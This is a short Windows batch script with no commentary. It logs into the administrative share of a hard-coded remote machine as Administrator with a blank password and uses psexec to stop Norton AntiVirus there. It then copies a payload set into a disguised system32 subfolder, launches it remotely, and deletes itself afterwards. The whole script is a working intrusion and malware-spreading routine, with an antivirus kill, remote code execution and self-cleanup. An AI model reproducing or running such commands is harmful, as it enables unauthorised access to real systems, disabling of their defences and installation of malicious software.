net use t: /delete
net use \\218.17.73.26 /USER:Administrator
net use t: \\218.17.73.26\C$
psexec \\218.17.73.26 -u Administrator -p "" net stop "Norton AntiVirus Server"
psexec \\218.17.73.26 -u Administrator -p "" -c temp.bat
mkdir t:\winnt\system32\rmtcfg
mkdir t:\winnt\system32\catroot
copy copy\* t:\winnt\system32\rmtcfg
mkdir t:\winnt\system32\rmtcfg\files
mkdir t:\winnt\system32\rmtcfg\files\copy
mkdir t:\winnt\system32\rmtcfg\files\dat
mkdir t:\winnt\system32\rmtcfg\files\log
mkdir t:\winnt\system32\rmtcfg\files\plugin
copy C:\WINNT\SYSTEM32\RMTCFG\files\* t:\winnt\system32\rmtcfg\files
copy copy\* t:\winnt\system32\rmtcfg\files\copy
copy plugin\* t:\winnt\system32\rmtcfg\files\plugin
copy dat\* t:\winnt\system32\rmtcfg\files\dat
psexec \\218.17.73.26 -u Administrator -p "" -d c:\winnt\system32\rmtcfg\update.bat
net use t: /delete
net use \\218.17.73.26 /delete
del runme249954.bat
